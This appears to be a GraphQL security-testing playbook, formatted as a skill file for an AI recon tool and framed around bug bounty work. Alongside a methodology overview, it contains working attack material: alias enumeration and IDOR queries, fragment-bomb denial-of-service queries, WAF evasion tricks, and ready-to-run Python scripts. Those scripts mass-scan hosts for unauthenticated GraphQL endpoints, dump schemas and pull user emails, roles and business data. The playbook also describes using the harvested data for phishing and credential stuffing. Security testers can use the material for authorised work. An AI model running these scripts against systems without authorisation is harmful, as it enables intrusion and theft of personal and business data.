<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: graphql
description: GraphQL security testing covering introspection, resolver injection, batching attacks, and authorization bypass
---

# GraphQL

Security testing for GraphQL APIs. Focus on resolver-level authorization, field/edge access control, batching abuse, and federation trust boundaries.

## Attack Surface

**Operations**
- Queries, mutations, subscriptions
- Persisted queries / Automatic Persisted Queries (APQ)

**Transports**
- HTTP POST/GET with `application/json` or `application/graphql`
- WebSocket: graphql-ws, graphql-transport-ws protocols
- Multipart for file uploads

**Schema Features**
- Introspection (`__schema`, `__type`)
- Directives: `@defer`, `@stream`, custom auth directives (@auth, @private)
- Custom scalars: Upload, JSON, DateTime
- Relay: global node IDs, connections/cursors, interfaces/unions

**Architecture**
- Federation (Apollo, GraphQL Mesh): `_service`, `_entities`
- Gateway vs subgraph authorization boundaries

## Reconnaissance

**Endpoint Discovery**
```
POST /graphql         {"query":"{__typename}"}
POST /api/graphql     {"query":"{__typename}"}
POST /v1/graphql      {"query":"{__typename}"}
POST /gql             {"query":"{__typename}"}
GET  /graphql?query={__typename}
```

Check for GraphiQL/Playground exposure with credentials enabled (cross-origin with cookies can leak data via postMessage bridges).

**Schema Acquisition**

If introspection enabled:
```graphql
{__schema{types{name fields{name args{name}}}}}
```

If disabled, infer schema via:
- `__typename` probes on candidate fields
- Field suggestion errors (submit near-miss names to harvest suggestions)
- "Expected one of" errors revealing enum values
- Type coercion errors exposing field structure
- Error taxonomy: different codes for "unknown field" vs "unauthorized field" reveal existence

**Schema Mapping**

Map: root operations, object types, interfaces/unions, directives, custom scalars. Identify sensitive fields: email, tokens, roles, billing, API keys, admin flags, file URLs. Note cascade paths where child resolvers may skip auth under parent assumptions.

## Key Vulnerabilities

### Authorization Bypass

**Field-Level IDOR**

Test with aliases comparing owned vs foreign objects in single request:
```graphql
query {
  own: order(id:"OWNED_ID") { id total owner { email } }
  foreign: order(id:"FOREIGN_ID") { id total owner { email } }
}
```

**Edge/Child Resolver Gaps**

Parent resolver checks auth, child resolver assumes it's already validated:
```graphql
query {
  user(id:"FOREIGN") {
    id
    privateData { secrets }  # Child may skip auth check
  }
}
```

**Relay Node Resolution**

Decode base64 global IDs, swap type/id pairs:
```graphql
query {
  node(id:"VXNlcjoxMjM=") { ... on User { email } }
}
```
Ensure per-type authorization is enforced inside resolvers. Verify connection filters (owner/tenant) apply before pagination; cursor tampering should not cross ownership boundaries.

**Mutation Bypass**
- Probe mutations for partial updates bypassing validation (JSON Merge Patch semantics)
- Test mutations that accept extra fields passed to downstream logic

### Batching & Alias Abuse

**Enumeration via Aliases**
```graphql
query {
  u1:user(id:"1"){email}
  u2:user(id:"2"){email}
  u3:user(id:"3"){email}
}
```
Bypasses per-request rate limits; exposes per-field vs per-request auth inconsistencies.

**Array Batching**

If supported (non-standard), submit multiple operations to achieve partial failures and bypass limits.

### Input Manipulation

**Type Confusion**
```
{id: 123}      vs {id: "123"}
{id: [123]}    vs {id: null}
{id: 0}        vs {id: -1}
```

**Duplicate Keys**
```json
{"id": 1, "id": 2}
```
Parser precedence varies; may bypass validation. Also test default argument values.

**Extra Fields**

Send unexpected keys in input objects; backends may pass them to resolvers or downstream logic.

### Cursor Manipulation

Decode cursors (usually base64) to:
- Manipulate offsets/IDs
- Skip filters
- Cross ownership boundaries

### Directive Abuse

**@defer/@stream**
```graphql
query {
  me { id }
  ... @defer { adminPanel { secrets } }
}
```
May return gated data in incremental delivery. Confirm server supports incremental delivery.

**Custom Directives**

@auth, @private and similar directives often annotate intent but do not enforce—verify actual checks in each resolver path.

### Complexity Attacks

**Fragment Bombs**
```graphql
fragment x on User { friends { ...x } }
query { me { ...x } }
```
Test depth/complexity limits, query cost analyzers, timeouts.

**Wide Selection Sets**

Abuse selection sets and fragments to force overfetching of sensitive subfields.

### Federation Exploitation

**SDL Exposure**
```graphql
query { _service { sdl } }
```

**Entity Materialization**
```graphql
query {
  _entities(representations:[
    {__typename:"User", id:"TARGET_ID"}
  ]) { ... on User { email roles } }
}
```
Gateway may enforce auth; subgraph resolvers may not. Look for cross-subgraph IDOR via inconsistent ownership checks.

### Subscription Security

- Authorization at handshake only, not per-message
- Subscribe to other users' channels via filter args
- Cross-tenant event leakage
- Abuse filter args in subscription resolvers to reference foreign IDs

### Persisted Query Abuse

- APQ hashes leaked from client bundles
- Replay privileged operations with attacker variables
- Hash bruteforce for common operations
- Validate hash→operation mapping enforces principal and operation allowlists

### CORS & CSRF

- Cookie-auth with GET queries enables CSRF on mutations via query parameters
- GraphiQL/Playground cross-origin with credentials leaks data
- Missing SameSite and origin validation

### File Uploads

GraphQL multipart spec:
- Multiple Upload scalars
- Filename/path traversal tricks
- Unexpected content-types, oversize chunks
- Server-side ownership/scoping for returned URLs

## WAF Evasion

**Query Reshaping**
- Comments and block strings (`"""..."""`)
- Unicode escapes
- Alias/fragment indirection
- JSON variables vs inline args
- GET vs POST vs `application/graphql`

**Fragment Splitting**

Split fields across fragments and inline spreads to avoid naive signatures:
```graphql
fragment a on User { email }
fragment b on User { password }
query { me { ...a ...b } }
```

## Bypass Techniques

**Transport Switching**
```
Content-Type: application/json
Content-Type: application/graphql
Content-Type: multipart/form-data
GET with query params
```

**Timing & Rate Limits**
- HTTP/2 multiplexing and connection reuse to widen timing windows
- Batching to bypass rate limits

**Naming Tricks**
- Case/underscore variations
- Unicode homoglyphs (server-dependent)
- Aliases masking sensitive field names

**Cache Confusion**
- CDN caching without Vary on Authorization
- Variable manipulation affecting cache keys
- Redirects and 304/206 behaviors leaking partial responses

---

## Path-Level Auth Gate Bypass (HIGH PRIORITY)

**The core issue**: Reverse proxies and load balancers apply HTTP Basic Authentication (or IP allowlists) at path `/` while explicitly excluding `/graphql`. The `/graphql` path is never covered by the auth gate, leaving the full API accessible unauthenticated. This is one of the highest-yield GraphQL findings in bug bounty because it is systematic across all non-production environments.

**Why it happens**: Teams configure Basic Auth in nginx/Caddy/Traefik to protect the frontend, then forget that the API path is a sibling route. Example misconfiguration:

```nginx
location / {
    auth_basic "Restricted";
    auth_basic_user_file /etc/.htpasswd;
}
# No auth_basic on /graphql — missed entirely
location /graphql {
    proxy_pass http://backend:4000;
}
```

---

### Step 1 — Identify Candidates (Non-prod with 401 gates)

Non-production environments are the primary target. They almost always have Basic Auth on `/` but inconsistent coverage of API paths.

Target naming patterns to look for:
```
dev.<domain>         dev2.<domain>
ppd.<domain>         ppe.<domain>
staging.<domain>     stg.<domain>
test.<domain>        tst.<domain>
uat.<domain>         qa.<domain>
preview.<domain>     pre.<domain>
sandbox.<domain>     demo.<domain>
beta.<domain>        rc.<domain>
```

Automated candidate discovery from live hosts:
```python
#!/usr/bin/env python3
"""
Scan a list of hosts, find those returning 401 on /, then test /graphql.
Usage: python3 graphql_auth_bypass.py -f live_hosts.txt
"""
import sys, ssl, json, argparse
from urllib.request import urlopen, Request
from urllib.error import HTTPError, URLError
from concurrent.futures import ThreadPoolExecutor, as_completed

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

GRAPHQL_PATHS = ["/graphql", "/api/graphql", "/v1/graphql", "/gql", "/query"]
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
PROBE = json.dumps({"query": "{__typename}"}).encode()

def check_root_auth(base):
    """Returns True if root / returns 401."""
    try:
        req = Request(base + "/", headers={"User-Agent": UA})
        urlopen(req, context=ctx, timeout=10)
        return False  # 200 = no auth gate
    except HTTPError as e:
        return e.code == 401
    except URLError:
        return False

def test_graphql_bypass(base, path):
    """POST to /graphql — returns (status, typename) or None."""
    try:
        req = Request(
            base + path,
            data=PROBE,
            headers={"Content-Type": "application/json", "User-Agent": UA}
        )
        resp = urlopen(req, context=ctx, timeout=10)
        body = json.loads(resp.read())
        typename = body.get("data", {}).get("__typename", "")
        return resp.status, typename
    except HTTPError as e:
        return e.code, None
    except Exception:
        return None, None

def scan_host(base):
    if not check_root_auth(base):
        return None  # No 401 gate, skip
    results = []
    for path in GRAPHQL_PATHS:
        status, typename = test_graphql_bypass(base, path)
        if status == 200 and typename:
            results.append({
                "host": base,
                "path": path,
                "status": status,
                "typename": typename,
                "finding": "AUTH_GATE_BYPASS"
            })
    return results if results else None

parser = argparse.ArgumentParser()
parser.add_argument("-f", "--file", required=True)
args = parser.parse_args()

hosts = [l.strip() for l in open(args.file) if l.strip()]
print(f"[*] Scanning {len(hosts)} hosts for GraphQL auth gate bypass...")

with ThreadPoolExecutor(max_workers=20) as ex:
    futures = {ex.submit(scan_host, h): h for h in hosts}
    for fut in as_completed(futures):
        result = fut.result()
        if result:
            for r in result:
                print(f"\n[BYPASS FOUND] {r['host']}{r['path']}")
                print(f"  Root / returns 401 (auth gate active)")
                print(f"  POST {r['path']} -> HTTP {r['status']}, __typename={r['typename']}")
```

---

### Step 2 — Confirm the Bypass

Three-step proof chain (each step compounds impact):

**Step 2a — Confirm auth gate on root:**
```python
import urllib.request, ssl, urllib.error

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

target = "https://dev.target.com"
try:
    urllib.request.urlopen(target + "/", context=ctx, timeout=10)
    print("No auth gate")
except urllib.error.HTTPError as e:
    print(f"Root: HTTP {e.code}, WWW-Authenticate: {e.headers.get('WWW-Authenticate')}")
    # Expected: HTTP 401, WWW-Authenticate: Basic realm="Restricted"
```

**Step 2b — Bypass via /graphql (no Authorization header):**
```python
import json, urllib.request, ssl

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

target = "https://dev.target.com"
payload = json.dumps({"query": "{__typename}"}).encode()
req = urllib.request.Request(
    target + "/graphql",
    data=payload,
    headers={"Content-Type": "application/json"}
)
resp = urllib.request.urlopen(req, context=ctx, timeout=15)
print(f"HTTP {resp.status}")
print(json.loads(resp.read()))
# Expected: HTTP 200, {"data": {"__typename": "Query"}}
# This is the bypass proof — /graphql returned 200 without any Authorization header
```

**Step 2c — Confirm introspection enabled (unauthenticated schema disclosure):**
```python
INTROSPECTION = {
    "query": """
    query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types { name kind }
      }
    }
    """
}

payload = json.dumps(INTROSPECTION).encode()
req = urllib.request.Request(
    target + "/graphql",
    data=payload,
    headers={"Content-Type": "application/json"}
)
resp = urllib.request.urlopen(req, context=ctx, timeout=15)
schema = json.loads(resp.read())
types = schema.get("data", {}).get("__schema", {}).get("types", [])
# Flag sensitive-sounding type names
sensitive = [t["name"] for t in types if any(
    w in t["name"].lower() for w in ["admin", "payment", "billing", "internal", "secret", "token", "credential"]
)]
print(f"Total types: {len(types)}")
print(f"Sensitive-sounding types: {sensitive}")
```

---

### Step 3 — Deep Schema Enumeration (Full Introspection)

```python
FULL_INTROSPECTION = {
    "query": """
    query FullIntrospection {
      __schema {
        queryType { name }
        mutationType { name }
        types {
          name
          kind
          fields(includeDeprecated: true) {
            name
            isDeprecated
            deprecationReason
            args { name type { name kind ofType { name kind } } }
            type { name kind ofType { name kind ofType { name kind } } }
          }
          inputFields { name type { name kind ofType { name kind } } }
          enumValues(includeDeprecated: true) { name }
        }
      }
    }
    """
}

payload = json.dumps(FULL_INTROSPECTION).encode()
req = urllib.request.Request(
    target + "/graphql",
    data=payload,
    headers={"Content-Type": "application/json"}
)
resp = urllib.request.urlopen(req, context=ctx, timeout=30)
schema = json.loads(resp.read())

# Extract all root query fields
schema_data = schema.get("data", {}).get("__schema", {})
types_by_name = {t["name"]: t for t in schema_data.get("types", []) if t.get("fields")}

query_root = schema_data.get("queryType", {}).get("name", "Query")
mutation_root = schema_data.get("mutationType", {}).get("name", "Mutation")

print(f"\n=== Query fields ({query_root}) ===")
for f in (types_by_name.get(query_root, {}).get("fields") or []):
    print(f"  {f['name']}")

print(f"\n=== Mutation fields ({mutation_root}) ===")
for f in (types_by_name.get(mutation_root, {}).get("fields") or []):
    flag = "[ADMIN?]" if "admin" in f["name"].lower() else ""
    print(f"  {flag} {f['name']}")
```

**What to flag in schema:**
- Any field with `admin`, `internal`, `system`, `debug`, `config`, `secret` in the name
- Payment/billing mutations: `charge`, `refund`, `invoice`, `subscription`
- User/identity operations: `createUser`, `deleteUser`, `updateRole`, `impersonate`
- Fields that accept IDs with no ownership context in the schema (IDOR candidates)

---

### Step 4 — Unauthenticated Data Extraction

After schema enumeration, identify queries that return real data without authentication. Prioritize:

**User/account data:**
```python
QUERIES_TO_PROBE = [
    # Generic patterns — substitute real field names from schema
    '{ users(limit: 3) { edges { node { id email role } } } }',
    '{ me { id email role permissions } }',
    '{ user(id: "1") { id email role } }',
    '{ accounts(first: 3) { nodes { id email } } }',
]

for q in QUERIES_TO_PROBE:
    try:
        payload = json.dumps({"query": q}).encode()
        req = urllib.request.Request(
            target + "/graphql",
            data=payload,
            headers={"Content-Type": "application/json"}
        )
        resp = urllib.request.urlopen(req, context=ctx, timeout=10)
        body = json.loads(resp.read())
        if body.get("data") and not body.get("errors"):
            print(f"[DATA RETURNED] {q[:60]}")
            print(f"  Response: {json.dumps(body['data'])[:200]}")
    except Exception as e:
        pass
```

**Configuration/business data (adapt field names from schema):**
```python
# After schema enumeration identifies real field names, test:
COMPANY_QUERY = """
query {
  companies(limit: 5, page: 1) {
    count
    edges {
      node {
        id
        name
        domain
        supportPhone
        registrationEmailPattern
        registrationTokenNeeded
      }
    }
  }
}
"""
# If this returns count + real company nodes = unauthenticated business data exposure
```

**Impact escalation from data returned:**
- Company/partner domains → phishing target list
- Registration email patterns → credential stuffing scope
- `registrationTokenNeeded: false` → no invite required for registration
- Admin mutation names exposed → confirm which operations are attack-reachable

---

### Step 5 — Multi-Environment Cross-Check

If dev.target.com is bypassed, test ALL non-production variants — they often share the same misconfiguration:

```python
ENVS = ["dev", "ppd", "ppe", "staging", "stg", "test", "uat", "qa", "preview", "sandbox", "beta"]
BASE_DOMAIN = "target.com"

for env in ENVS:
    host = f"https://{env}.{BASE_DOMAIN}"
    # Run check_root_auth + test_graphql_bypass for each
```

Each additional affected environment compounds the impact and strengthens the finding.

---

### Combined Finding Template

When this pattern is confirmed, the full severity chain is:

```
HTTP Basic Auth bypass (proxy misconfiguration)
  → Unauthenticated GraphQL access
    → Introspection enabled (schema disclosure)
      → Sensitive resolver names exposed (admin*, payment*)
        → Unauthenticated data extraction from unprotected resolvers
          → Business configuration / PII returned to unauthenticated attacker
```

**CVSS v3.1 Scoring:**
- AV:N / AC:L / PR:N / UI:N → Base score 7.5 for data extraction
- Bump to 8.x if admin mutations are directly accessible
- Report ALL affected environments (dev + ppd = 2x evidence = stronger case)

**Bug Bounty Acceptance Score:**
- Reproducibility: 10/10 (deterministic, no auth needed)
- Impact realism: 9/10 (real data returned, introspection enabled)
- Scope clarity: 8/10 (non-prod in scope if wildcard or explicitly listed)
- Would this be accepted? **YES** — HIGH severity if data extraction confirmed

---

## Testing Methodology

1. **Fingerprint** - Identify endpoints, transports, stack (Apollo, Hasura, etc.), GraphiQL exposure
2. **Auth gate check** - For every host returning 401 on `/`, immediately test `/graphql` without credentials
3. **Non-prod sweep** - Enumerate dev.*, ppd.*, staging.*, uat.* subdomains; they are the primary target for path-level auth bypass
4. **Schema mapping** - Introspection or inference to build complete type graph
5. **Principal matrix** - Collect tokens for unauth, user, premium, admin roles with at least one valid object ID per subject
6. **Field sweep** - Test each resolver with owned vs foreign IDs via aliases in same request
7. **Transport parity** - Verify same auth on HTTP, WebSocket, persisted queries
8. **Federation probe** - Test `_service` and `_entities` for subgraph auth gaps
9. **Edge cases** - Cursors, @defer/@stream, subscriptions, file uploads

## Validation Requirements

- `GET / → HTTP 401 (WWW-Authenticate: Basic realm=...)` — auth gate confirmed
- `POST /graphql → HTTP 200 {"data": {"__typename": "Query"}}` — bypass confirmed (NO Authorization header sent)
- Introspection result showing sensitive type/mutation names
- At least one query returning real data without credentials
- Paired requests (owner vs non-owner) showing unauthorized access for resolver-level IDOR
- Resolver-level bypass: parent checks present, child field exposes data
- Transport parity proof: HTTP and WebSocket for same operation
- Federation bypass: `_entities` accessing data without subgraph auth
- Minimal payloads with exact selection sets and variable shapes
- Document exact resolver paths that missed enforcement
